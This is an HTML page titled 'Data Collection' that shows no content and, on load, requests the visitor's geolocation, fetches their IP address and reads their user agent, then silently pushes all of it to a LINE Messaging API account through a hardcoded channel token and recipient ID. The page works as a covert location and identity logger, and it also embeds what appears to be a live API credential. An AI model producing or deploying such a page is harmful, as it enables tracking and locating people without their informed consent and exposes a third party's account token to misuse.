<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collection</title>
    <script>
        // Function to get latitude and longitude
        function getLatLong() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const long = position.coords.longitude;
                    sendData({ lat, long });
                });
            } else {
                console.log("Geolocation is not supported by this browser.");
            }
        }

        // Function to get IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error fetching IP address:", error);
            }
        }

        // Function to get user agent
        function getUserAgent() {
            return navigator.userAgent;
        }

        // Function to get phone number (this is not possible directly due to privacy concerns)
        function getPhoneNumber() {
            return "Phone number cannot be retrieved directly due to privacy concerns.";
        }

        // Function to send data to Line OA using Channel Token
        async function sendData(data) {
            const ip = await getIP();
            const userAgent = getUserAgent();
            const phoneNumber = getPhoneNumber();

            const payload = {
                ...data,
                ip,
                userAgent,
                phoneNumber
            };

            // Line Messaging API endpoint
            const lineApiEndpoint = 'https://api.line.me/v2/bot/message/push';
            
            // Replace with your Line Channel Token
            const channelToken = 'Y5f04lJbHSrP3Dd1W7ksrBzB9I15XQH8z5Wzm31s/uHqtRV2yGfF/dscvqYrycBmvNjR/L9EUajPTV1CO9V9/KduqLujwCA/9OEX+EFwGH6NXnckX+qLZBZ8K8Y+vHao4EES9XKmG60qzYzeUD4n1AdB04t89/1O/w1cDnyilFU=';
            
            // Replace with your recipient's LINE user ID or group ID
            const to = 'U69aa2cb90c9f40291278c346c50dc021';

            try {
                const response = await fetch(lineApiEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${channelToken}`
                    },
                    body: JSON.stringify({
                        to: to,
                        messages: [
                            {
                                type: 'text',
                                text: `User Data Collected:\n- Location: ${data.lat}, ${data.long}\n- IP: ${ip}\n- User Agent: ${userAgent}`
                            }
                        ]
                    })
                });

                if (response.ok) {
                    console.log("Data sent successfully to Line OA using Channel Token.");
                } else {
                    console.error("Failed to send data to Line OA:", await response.text());
                }
            } catch (error) {
                console.error("Error sending data to Line OA:", error);
            }
        }

        // Automatically collect and send data when the page loads
        window.onload = function() {
            getLatLong();
        };
    </script>
</head>
<body>
    <!-- No UI elements are displayed -->
</body>
</html>
